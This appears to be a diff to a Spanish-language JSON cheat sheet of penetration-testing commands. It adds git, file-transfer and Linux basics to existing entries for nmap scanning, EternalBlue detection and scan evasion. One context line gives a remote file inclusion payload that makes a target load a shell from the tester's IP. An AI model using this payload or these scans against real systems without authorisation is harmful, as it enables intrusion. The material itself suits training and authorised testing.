@@ -17,7 +17,7 @@
     {"titulo": "RFI: Shell remota", "cmd": "http://TARGET/index.php?page=http://TU_IP/shell.txt"}
   ],
   "nmap_advanced": [
-    {"titulo": "Escaneo de Red Completo", "cmd": "nmap -p- -sV -sC -T4 -oN scan_completo.txt OBJETIVO"},
+    {"titulo": "Escaneo de Red Completo en modo loco", "cmd": "nmap -p- -sVC -T4 -oN scan_completo.txt OBJETIVO"},
     {"titulo": "Detectar MS17-010 (EternalBlue)", "cmd": "nmap -p445 --script smb-vuln-ms17-010 OBJETIVO"},
     {"titulo": "Evasión: Fragmentación de paquetes", "cmd": "nmap -f -t 0 OBJETIVO"},
     {"titulo": "Enumeración NFS", "cmd": "nmap -p 2049 --script nfs-ls,nfs-statfs,nfs-showmount OBJETIVO"}
@@ -71,5 +71,87 @@
     {"titulo": "HackTricks (La biblia)", "cmd": "https://book.hacktricks.xyz/"},
     {"titulo": "GTFOBins (Linux Escala)", "cmd": "https://gtfobins.github.io/"},
     {"titulo": "LOLBAS (Windows Escala)", "cmd": "https://lolbas-project.github.io/"}
+  ],
+"git": [
+    {
+      "titulo": "Configurar usuario y correo",
+      "cmd": "git config --global user.name \"Tu Nombre\" && git config --global user.email \"tu@email.com\""
+    },
+    {
+      "titulo": "Actualizar repo (Add, Commit, Push)",
+      "cmd": "git add . && git commit -m \"Actualización\" && git push"
+    },
+    {
+      "titulo": "Ver estado de archivos",
+      "cmd": "git status"
+    },
+    {
+      "titulo": "Deshacer último commit (manteniendo cambios)",
+      "cmd": "git reset --soft HEAD~1"
+    },
+    {
+      "titulo": "Clonar con profundidad 1 (más rápido)",
+      "cmd": "git clone --depth 1 URL_DEL_REPO"
+    }
+  ],
+  "transfer_redes": [
+    {
+      "titulo": "Levantar servidor Python rápido",
+      "cmd": "python3 -m http.server 8080"
+    },
+    {
+      "titulo": "Descargar archivo con wget",
+      "cmd": "wget http://IP_ORIGEN:8080/archivo.txt"
+    },
+    {
+      "titulo": "Ver puertos abiertos en mi máquina",
+      "cmd": "ss -tulpn"
+    },
+    {
+      "titulo": "Ver mi IP interna",
+      "cmd": "ip a | grep inet"
+    },
+    {
+      "titulo": "Copiar archivo por SSH (SCP)",
+      "cmd": "scp archivo.txt usuario@IP_DESTINO:/ruta/destino"
+    }
+  ],
+  "linux_basics": [
+    {
+      "titulo": "Listar todo (incluyendo ocultos y permisos)",
+      "cmd": "ls -la"
+    },
+    {
+      "titulo": "Ver ruta actual completa",
+      "cmd": "pwd"
+    },
+    {
+      "titulo": "Crear carpeta y carpetas padres",
+      "cmd": "mkdir -p nombre/subcarpeta"
+    },
+    {
+      "titulo": "Borrar archivo o carpeta recursivamente",
+      "cmd": "rm -rf nombre_archivo_o_carpeta"
+    },
+    {
+      "titulo": "Copiar carpeta entera",
+      "cmd": "cp -r carpeta_origen carpeta_destino"
+    },
+    {
+      "titulo": "Dar permisos de ejecución a un script",
+      "cmd": "chmod +x archivo.sh"
+    },
+    {
+      "titulo": "Buscar un texto dentro de archivos",
+      "cmd": "grep -r \"texto_a_buscar\" ."
+    },
+    {
+      "titulo": "Ver uso de recursos (Procesos/RAM)",
+      "cmd": "top"
+    },
+    {
+      "titulo": "Ver historial de comandos",
+      "cmd": "history"
+    }
   ]
 }
